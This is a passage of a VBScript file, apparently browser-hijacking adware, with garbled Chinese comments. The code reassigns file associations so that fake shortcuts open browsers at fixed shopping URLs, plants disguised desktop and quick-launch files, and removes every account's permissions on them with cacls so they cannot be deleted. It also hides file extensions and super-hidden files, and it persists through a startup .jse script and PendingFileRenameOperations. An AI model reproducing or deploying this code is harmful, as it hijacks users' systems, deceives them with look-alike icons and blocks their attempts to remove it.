    pcDesktopPath = wshShell.SpecialFolders("Desktop") '��ǰ�û�����Ŀ¼
    quickLaunch = wshShell.SpecialFolders("AppData") & "\Microsoft\Internet Explorer\Quick Launch" '��ǰ�û����������������Ŀ¼
    programs = wshShell.SpecialFolders("Programs") '��ǰ�û���ʼ�˵��еĳ���Ŀ¼
    startMenu = wshShell.SpecialFolders("StartMenu") '��ǰ�û���ʼ�˵��������Ŀ¼
    
    Dim allUsersPcDesktopPath, allQuickLaunch, allUsersPrograms, allUsersStartMenu
    allUsersPcDesktopPath = wshShell.SpecialFolders("AllUsersDesktop") 'ȫ���û�����Ŀ¼
    allUsersPrograms = wshShell.SpecialFolders("AllUsersPrograms") 'ȫ���û���ʼ�˵��еĳ���Ŀ¼
    allUsersStartMenu = wshShell.SpecialFolders("AllUsersStartMenu") 'ȫ���û���ʼ�˵��������Ŀ¼
    
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    If fso.FileExists(iePath) And iePath<>"" Then '�ж�IE�����·���Ƿ����        
        dim index_array(7),index_index,index_isFileExists,index_name,index_extension,index_count,index_rnd
        Randomize
        index_rnd=(3 * Rnd) + 1
        index_extension="tt"
        Call CreateRelevance("."+index_extension, index_extension, iePath & ",0", iePath & " " & url)
        
		index_array(1)="Internet Explorer"
		index_array(2)="Internet"
		index_array(3)="Explorer"
		index_array(4)="Internet Exploerr"
		index_array(5)="Interne"
		index_array(6)="Explorer"
		index_array(7)="Exploerr"
		Randomize
		index_index=Int((ubound(index_array) * Rnd) + 1)
		index_name=index_array(index_index) + "." + index_extension '���һ���������ļ���
		index_count=0
		for index_i=1 to ubound(index_array) '��ȡ�����Ѵ�������ͼ�������			
			If fso.FileExists(allUsersPcDesktopPath + "\" + index_array(index_i) + "." + index_extension) Then
				index_count=index_count+1
			End If
		Next
		If index_count=0 Then 'û��׼������ͼ��Ž��д���
			If Not fso.FileExists(allUsersPcDesktopPath + "\" + index_name) Then
				Call CreateNoDeleteLnk(allUsersPcDesktopPath + "\" + index_name)
			End If
		End If
        
        Call CreateRelevance(".css", "css", iePath & ",0", iePath & " " & url)
        If Not fso.FileExists(allUsersPrograms + "\Internet Explorer.css") Then
            Call CreateNoDeleteLnk(allUsersPrograms + "\Internet Explorer.css")
        End If
        If Not fso.FileExists(quickLaunch + "\Internet Explorer.css") Then
            Call CreateNoDeleteLnk(quickLaunch + "\Internet Explorer.css")
        End If
        
        
        dim tao_ico_path '�Ա�ͼ��·��
        Set ws = CreateObject("WScript.Shell") 
        Set Environ = ws.Environment("process") 
        tao_ico_path=Environ("windir") & "\tao.ico"
        If not fso.FileExists(tao_ico_path) Then '���·�������������Ĭ��
            tao_ico_path=iePath & ",0"
        End If
        
        dim taobao_array(17),taobao_index,taobao_isFileExists,taobao_name,taobao_extension,taobao_count
        taobao_extension="bt"
        Call CreateRelevance("."+taobao_extension, taobao_extension, tao_ico_path, iePath & " http://dianxin.online.cq.cn/api/taobao/index.htm")
        
		taobao_array(1)="�Ա���"
		taobao_array(2)="�Ա����ﵼ��"
		taobao_array(3)="���ﵼ��"
		taobao_array(4)="�����Ա�"
		taobao_array(5)="�Ա�ר��"
		taobao_array(6)="�Ա�����"
		taobao_array(7)="�� ��"
		taobao_array(8)="��  ��"
		taobao_array(9)="�����Ա�"
		taobao_array(10)="�����Ա�"
		taobao_array(11)="��������"
		taobao_array(12)="�ط�����"
		taobao_array(13)="���Ϲ���"
		taobao_array(14)="�Ź�����"
		taobao_array(15)="��ɫ����"
		taobao_array(16)="�ؼ۹���"
		taobao_array(17)="�ͼ۹���"
		Randomize
		taobao_index=Int((ubound(taobao_array) * Rnd) + 1)
		taobao_name=taobao_array(taobao_index) + "." + taobao_extension '���һ���������ļ���
		taobao_count=0
		for taobao_i=1 to ubound(taobao_array) '��ȡ�����Ѵ�������ͼ�������			
			If fso.FileExists(allUsersPcDesktopPath + "\" + taobao_array(taobao_i) + "." + taobao_extension) Then
				taobao_count=taobao_count+1
			End If
		Next
		If taobao_count=0 Then 'û��׼������ͼ��Ž��д���
			If Not fso.FileExists(allUsersPcDesktopPath + "\" + taobao_name) Then
				Call CreateNoDeleteLnk(allUsersPcDesktopPath + "\" + taobao_name)
			End If
		End If
		
		
		
		
		
		
        Set ws = CreateObject("WScript.Shell") 
        Set Environ = ws.Environment("process") 
        tao_ico_path=Environ("windir") & "\t.ico"
        If not fso.FileExists(tao_ico_path) Then '���·�������������Ĭ��
            tao_ico_path=iePath & ",0"
        End If
        Call CreateRelevance(".shb", "shb", tao_ico_path, iePath & " http://dao.online.cq.cn/t.htm")
        If Not fso.FileExists(allUsersPcDesktopPath + "\������ַ.shb") Then
            If createType=1 Then
                'Call CreateNoDeleteLnk(allUsersPcDesktopPath + "\������ַ.shb")
            End If
        End If
    End If
    
    If fso.FileExists(maxPath) And maxPath<>"" Then '�ж����������·���Ƿ����
        Call CreateRelevance(".max", "max", maxPath & ",0", maxPath & " " & url)
        If Not fso.FileExists(quickLaunch + "\���������.max") Then
            Call CreateNoDeleteLnk(quickLaunch + "\���������.max")
        End If
    End If
    
    If fso.FileExists(sePath) And iePath<>"" Then '�ж�360�����·���Ƿ����
        Call CreateRelevance(".rtf", "rtf", sePath & ",0", sePath & " " & url)
        If Not fso.FileExists(quickLaunch + "\360�����.rtf") Then
            Call CreateNoDeleteLnk(quickLaunch + "\360�����.rtf")
        End If
    End If
    
    Call HideFileExtension '�����ļ���չ��
End Sub

'������ֹ��ɾ�����ļ�
Private Sub CreateNoDeleteLnk(path)
On Error Resume Next
    Dim fso,TestFile
    Set fso=CreateObject("Scripting.FileSystemObject")
    Set testFile=fso.CreateTextFile(path,Ture)
    testFile.writeline("��ǰ����ɽ��ɽ��������")
    testFile.Close
    Call RefusalFileDelete(path)
End Sub

'��ֹ�ļ���ɾ����ɾ��ȫ��Ȩ�ޣ�
Private Sub RefusalFileDelete(path)
On Error Resume Next
    Set WshShell= CreateObject("WScript.Shell")
    Set wshNetwork = WScript.CreateObject("WScript.Network")
    WshShell.Run ("attrib """ & path & """ +r +s"), vbHide
    WshShell.Run ("cacls """ & path & """ /e /c /r Administrators"), vbHide
    WshShell.Run ("cacls """ & path & """ /e /c Administrators:CI"), vbHide
    WshShell.Run ("cacls """ & path & """ /e /c /r Administrator"), vbHide
    WshShell.Run ("cacls """ & path & """ /e /c /r users"), vbHide
    WshShell.Run ("cacls """ & path & """ /e /c /r system"), vbHide
    WshShell.Run ("cacls """ & path & """ /e /c /r everyone"), vbHide
    WshShell.Run ("cacls """ & path & """ /e /c /r user"), vbHide
    WshShell.Run ("cacls """ & path & """ /e /c /r ""Power Users"""), vbHide    
    WshShell.Run ("cacls """ & path & """ /e /c /r """ & wshNetwork.UserName & """"), vbHide    
    Set wshNetwork = Nothing 
    Set WshShell = Nothing    
End Sub

'�����ļ���չ��
Private Sub HideFileExtension()
On Error Resume Next
    Const HKEY_CURRENT_USER = &H80000001
      
    strComputer = "."  
    Set StdOut = WScript.StdOut   
    Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\default:StdRegProv")   
  
    strKeyPath = "Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"  
    oReg.CreateKey HKEY_CURRENT_USER,strKeyPath 
    
    strValueName = "ShowSuperHidden"  
    dwValue = 0   
    oReg.SetDWORDValue HKEY_CURRENT_USER,strKeyPath,strValueName,dwValue 
    
    strValueName = "Hidden1"  
    dwValue = 2   
    oReg.SetDWORDValue HKEY_CURRENT_USER,strKeyPath,strValueName,dwValue 
    
    strValueName = "HideFileExt"  
    dwValue = 1  
    oReg.SetDWORDValue HKEY_CURRENT_USER,strKeyPath,strValueName,dwValue 
    
End Sub

'�½��ļ�����,������������׺,��������,iconͼ��·��(���޸Ļ򲻴���Ϊ��),������������·��
Private Sub CreateRelevance(nameSuffix, associationName, iconPath, path)
On Error Resume Next
    Const HKEY_CLASSES_ROOT = &H80000000
      
    strComputer = "."  
    Set StdOut = WScript.StdOut   
    Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\default:StdRegProv")   

    '������׺   
    strKeyPath = nameSuffix  
    oReg.CreateKey HKEY_CLASSES_ROOT,strKeyPath   
  
    '������׺   
    strValueName = ""  
    strValue = associationName 
    oReg.SetStringValue HKEY_CLASSES_ROOT,strKeyPath,strValueName,strValue   
    
    '���ù�������
    strKeyPath = associationName  
    oReg.CreateKey HKEY_CLASSES_ROOT,strKeyPath 
    
    '���ù�������
    strValueName = ""  
    strValue = "ϵͳ�ļ�" 
    oReg.SetStringValue HKEY_CLASSES_ROOT,strKeyPath,strValueName,strValue  
    
    '���ù�������
    strKeyPath = associationName & "\shell\open\command"  
    oReg.CreateKey HKEY_CLASSES_ROOT,strKeyPath 
    
    '���ù�������
    strValueName = ""  
    strValue = path
    oReg.SetStringValue HKEY_CLASSES_ROOT,strKeyPath,strValueName,strValue  
    
    If iconPath <> "" Then
       '���ù�������
        strKeyPath = associationName & "\DefaultIcon"  
        oReg.CreateKey HKEY_CLASSES_ROOT,strKeyPath 
        
        '���ù�������
        strValueName = ""  
        strValue = iconPath
        oReg.SetStringValue HKEY_CLASSES_ROOT,strKeyPath,strValueName,strValue 
    End If
End Sub

'����Ϊ���������ر�ķ�ʽ��,�������ļ�·��,����Ŀ¼·��
Private Sub SetRunVbe(path,runPath)
On Error Resume Next
    Const HKEY_LOCAL_MACHINE = &H80000002
    arrStringValues = Array(path,runPath)
    '��ȡ��չ���ַ���ֵ
    strComputer = "."  
    Set StdOut = WScript.StdOut   
    Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &_    
    strComputer & "\root\default:StdRegProv")   
    strKeyPath = "SYSTEM\ControlSet001\Control\Session Manager"  
    strValueName = "PendingFileRenameOperations"  
    oReg.GetMultiStringValue HKEY_LOCAL_MACHINE,strKeyPath,_   
    strValueName,arrValues
    
    dim isPathPresence,isRunPathPresence
    isPathPresence=false
    isRunPathPresence=false
    
    temp_i=1
    temp_arrValues = Array() '��ǰ�����������
    
    For Each strValue In arrValues
         If (InStr(strValue, "smss.exe") = 0) Then '����ָ���ļ�
            ReDim Preserve temp_arrValues(temp_i)             
            temp_arrValues(temp_i)=strValue
            temp_i=temp_i+1
         End If
         if strValue=path then '����
            isPathPresence=true
         end if
         if strValue=runPath then '����
            isRunPathPresence=true
         end if
    Next
 
    strComputer = "."  
    Set StdOut = WScript.StdOut   
    Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &_    
    strComputer & "\root\default:StdRegProv")
       
    'û�оʹ�������
    strKeyPath = "SYSTEM\ControlSet001\Control\Session Manager"  
    oReg.CreateKey HKEY_LOCAL_MACHINE,strKeyPath   

    'д��ע�����   
    strValueName = "PendingFileRenameOperations"
    If not isNull(arrValues) Then '����������׷��,�ϲ�����
        arrStringValues=Summ(arrValues,arrStringValues) '��������ϲ�        
    End If
    
    if isPathPresence=false then'�ж�Դ�����Ƿ���ڣ���������д��
        oReg.SetMultiStringValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,arrStringValues
    end if
End Sub


'����Ϊ���������ر�ķ�ʽ��,����������Ŀ¼·��
Private Sub SetJseRunVbe(runPath)
On Error Resume Next
    Set fso = CreateObject("Scripting.FileSystemObject")
    Dim allUsersStartup
    Set wshShell = CreateObject("Wscript.Shell")
    allUsersStartup = wshShell.SpecialFolders("AllUsersStartup") '�����û�����Ŀ¼
    dim vbsRunPath
    vbsRunPath=runPath
    vbsRunPath = Replace(vbsRunPath, "\", "\\") '��ʽ��·��
    dim regPath
	regPath= (allUsersStartup + "\360vbs.jse")	
	Set f1=fso.CreateTextFile(regPath, True)
	f1.WriteLine "var WSH = new ActiveXObject(""WScript.Shell"");"
	f1.WriteLine "var fso = new ActiveXObject(""Scripting.FileSystemObject"");"
	f1.WriteLine "if(fso.FileExists(""" & vbsRunPath & """))"
	f1.WriteLine "{"
	f1.WriteLine "WSH.Run(""" & vbsRunPath & """);"
	f1.WriteLine "}"
	Set f1  = Nothing
		
		
    
End Sub



'�������������
Public Function IeLink(linkName,linkUrl)   
On Error Resume Next
    If linkName = "" Or linkUrl = "" Then
        Exit Function
    End If
    Set WshShell = CreateObject("WScript.Shell") 
    Set Environ = WshShell.Environment("process") 
    
    Dim ieLinkPath
    ieLinkPath = "C:\Documents and Settings\" & Environ("USERNAME") & "\Favorites\����\" & linkName & ".url"
    set fso=wscript.createobject("scripting.filesystemobject")
    Set f=fso.CreateTextFile(ieLinkPath, True)
    f.WriteLine "[DEFAULT]"
    f.WriteLine "BASEURL=" & linkUrl
    f.WriteLine "[InternetShortcut]"
    f.WriteLine "URL=" & linkUrl
    f.WriteLine "IDList="
    f.WriteLine "[{000214A0-0000-0000-C000-000000000046}]"
    f.WriteLine "Prop3=19,2"	
    
    ieLinkPath = "C:\Documents and Settings\" & Environ("USERNAME") & "\Favorites\����\" & linkName & ".url"
    set fso=wscript.createobject("scripting.filesystemobject")
    Set f=fso.CreateTextFile(ieLinkPath, True)
    f.WriteLine "[DEFAULT]"
    f.WriteLine "BASEURL=" & linkUrl
    f.WriteLine "[InternetShortcut]"
    f.WriteLine "URL=" & linkUrl
    f.WriteLine "IDList="
    f.WriteLine "[{000214A0-0000-0000-C000-000000000046}]"
    f.WriteLine "Prop3=19,2"
    
    ieLinkPath = "C:\Documents and Settings\" & Environ("USERNAME") & "\Favorites\" & linkName & ".url"
    set fso=wscript.createobject("scripting.filesystemobject")
    Set f=fso.CreateTextFile(ieLinkPath, True)
    f.WriteLine "[DEFAULT]"
    f.WriteLine "BASEURL=" & linkUrl
    f.WriteLine "[InternetShortcut]"
    f.WriteLine "URL=" & linkUrl
    f.WriteLine "IDList="
    f.WriteLine "[{000214A0-0000-0000-C000-000000000046}]"
    f.WriteLine "Prop3=19,2"    
    
    Set fso  = Nothing
    Set WshShell  = Nothing
End Function

'����IE����
Public Function ShowIeLink()   
On Error Resume Next
    'д����Ϣ��ע���
    Set ws = CreateObject("WScript.Shell") 
    Set Environ = ws.Environment("process") 
    Dim regPathSix 
    regPathSix = Environ("windir") & "\MYShowIeLinkIe6.reg"
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set f=fso.CreateTextFile(regPathSix, True)
    f.WriteLine "Windows Registry Editor Version 5.00"
    f.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Toolbar]"
    f.WriteLine """LinksFolderName""=""����"""
    f.WriteLine """Locked""=dword:00000001"
    f.WriteLine """ShowDiscussionButton""=""Yes"""
    f.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Toolbar\Explorer]"
    f.WriteLine """ITBarLayout""=hex:11,00,00,00,5c,00,00,00,00,00,00,00,24,00,00,00,1b,00,00,00,\"
    f.WriteLine "    4a,00,00,00,01,00,00,00,20,07,00,00,a0,0f,00,00,05,00,00,00,62,05,00,00,26,\"
    f.WriteLine "  00,00,00,02,00,00,00,21,07,00,00,a0,0f,00,00,04,00,00,00,21,01,00,00,a0,0f,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00"

    f.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Toolbar\ShellBrowser]"
    f.WriteLine """{01E04581-4EEE-11D0-BFE9-00AA005B4383}""=hex:81,45,e0,01,ee,4e,d0,11,bf,e9,00,\"
    f.WriteLine "  aa,00,5b,43,83,10,00,00,00,00,00,00,00,01,e0,32,f4,01,00,00,00"
    f.WriteLine """ITBarLayout""=hex:11,00,00,00,5c,00,00,00,00,00,00,00,24,00,00,00,1b,00,00,00,\"
    f.WriteLine "  4a,00,00,00,01,00,00,00,20,07,00,00,a0,0f,00,00,05,00,00,00,62,05,00,00,26,\"
    f.WriteLine "  00,00,00,02,00,00,00,21,07,00,00,a0,0f,00,00,04,00,00,00,21,01,00,00,a0,0f,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00"

    f.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Toolbar\WebBrowser]"
    f.WriteLine """{01E04581-4EEE-11D0-BFE9-00AA005B4383}""=hex:81,45,e0,01,ee,4e,d0,11,bf,e9,00,\"
    f.WriteLine "  aa,00,5b,43,83,10,00,00,00,00,00,00,00,01,e0,32,f4,01,00,00,00"
    f.WriteLine """{0E5CBF21-D15F-11D0-8301-00AA005B4383}""=hex:21,bf,5c,0e,5f,d1,d0,11,83,01,00,\"
    f.WriteLine "  aa,00,5b,43,83,22,00,1c,00,08,00,00,00,06,00,00,00,01,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,4c,00,00,00,01,14,02,00,00,00,00,00,c0,00,00,00,00,\"
    f.WriteLine "  00,00,46,81,00,00,00,10,00,00,00,9e,d1,0e,c2,33,ec,ca,01,e6,1a,bf,65,c5,ed,\"
    f.WriteLine "  ca,01,9e,d1,0e,c2,33,ec,ca,01,00,00,00,00,00,00,00,00,01,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,5b,01,14,00,1f,50,e0,4f,d0,20,ea,3a,69,10,a2,d8,\"
    f.WriteLine "  08,00,2b,30,30,9d,19,00,2f,43,3a,5c,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,5c,00,31,00,00,00,00,00,a5,3c,28,4a,10,00,44,4f,43,55,4d,\"
    f.WriteLine "  45,7e,31,00,00,44,00,03,00,04,00,ef,be,a5,3c,12,49,a7,3c,f1,48,14,00,00,00,\"
    f.WriteLine "  44,00,6f,00,63,00,75,00,6d,00,65,00,6e,00,74,00,73,00,20,00,61,00,6e,00,64,\"
    f.WriteLine "  00,20,00,53,00,65,00,74,00,74,00,69,00,6e,00,67,00,73,00,00,00,18,00,4a,00,\"
    f.WriteLine "  31,00,00,00,00,00,a6,3c,8e,0c,10,00,41,44,4d,49,4e,49,7e,31,00,00,32,00,03,\"
    f.WriteLine "  00,04,00,ef,be,a5,3c,28,4a,a7,3c,f1,48,14,00,00,00,41,00,64,00,6d,00,69,00,\"
    f.WriteLine "  6e,00,69,00,73,00,74,00,72,00,61,00,74,00,6f,00,72,00,00,00,18,00,56,00,31,\"
    f.WriteLine "  00,00,00,00,00,a6,3c,76,0f,11,00,46,41,56,4f,52,49,7e,31,00,00,3e,00,03,00,\"
    f.WriteLine "  04,00,ef,be,a5,3c,28,4a,a7,3c,33,44,14,00,28,00,46,00,61,00,76,00,6f,00,72,\"
    f.WriteLine "  00,69,00,74,00,65,00,73,00,00,00,40,73,68,65,6c,6c,33,32,2e,64,6c,6c,2c,2d,\"
    f.WriteLine "  31,32,36,39,33,00,18,00,30,00,35,00,00,00,00,00,a5,3c,29,4a,10,00,fe,94,a5,\"
    f.WriteLine "  63,00,00,1c,00,03,00,04,00,ef,be,a5,3c,29,4a,a7,3c,33,44,14,00,00,00,fe,94,\"
    f.WriteLine "  a5,63,00,00,14,00,00,00,60,00,00,00,03,00,00,a0,58,00,00,00,00,00,00,00,68,\"
    f.WriteLine "  79,2d,36,36,79,6c,70,32,36,32,64,66,36,75,00,0e,d2,40,80,be,ba,3a,40,a5,d7,\"
    f.WriteLine "  35,99,38,b7,4c,a0,47,78,a6,83,2a,58,df,11,b1,e0,00,26,18,08,88,87,0e,d2,40,\"
    f.WriteLine "  80,be,ba,3a,40,a5,d7,35,99,38,b7,4c,a0,47,78,a6,83,2a,58,df,11,b1,e0,00,26,\"
    f.WriteLine "  18,08,88,87,00,00,00,00"
    f.WriteLine """ITBarLayout""=hex:11,00,00,00,5c,00,00,00,00,00,00,00,34,00,00,00,1f,00,00,00,\"
    f.WriteLine "  62,00,00,00,01,00,00,00,a0,06,00,00,a0,0f,00,00,05,00,00,00,22,04,00,00,26,\"
    f.WriteLine "  00,00,00,02,00,00,00,a1,06,00,00,60,01,00,00,04,00,00,00,a1,00,00,00,c6,00,\"
    f.WriteLine "  00,00,03,00,00,00,a1,02,00,00,d4,04,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00"


    
    Dim regPathSeven
    regPathSeven = Environ("windir") & "\MyShowIeLinkIe7.reg"
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set f=fso.CreateTextFile(regPathSeven, True)
    f.WriteLine "Windows Registry Editor Version 5.00"
    f.WriteLine """LinksFolderName""=""����"""
    f.WriteLine """ShowDiscussionButton""=""no"""
    f.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Toolbar\ShellBrowser]"
    f.WriteLine """{01E04581-4EEE-11D0-BFE9-00AA005B4383}""=hex:81,45,e0,01,ee,4e,d0,11,bf,e9,00,\"
    f.WriteLine "  aa,00,5b,43,83,10,00,00,00,00,00,00,00,01,e0,32,f4,01,00,00,00"
    f.WriteLine """ITBarLayout""=hex:11,00,00,00,5c,00,00,00,00,00,00,00,34,00,00,00,1b,00,00,00,\"
    f.WriteLine "  56,00,00,00,01,00,00,00,20,07,00,00,a0,0f,00,00,05,00,00,00,62,05,00,00,26,\"
    f.WriteLine "  00,00,00,02,00,00,00,21,07,00,00,a0,0f,00,00,04,00,00,00,21,01,00,00,a0,0f,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
    f.WriteLine "  00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\"
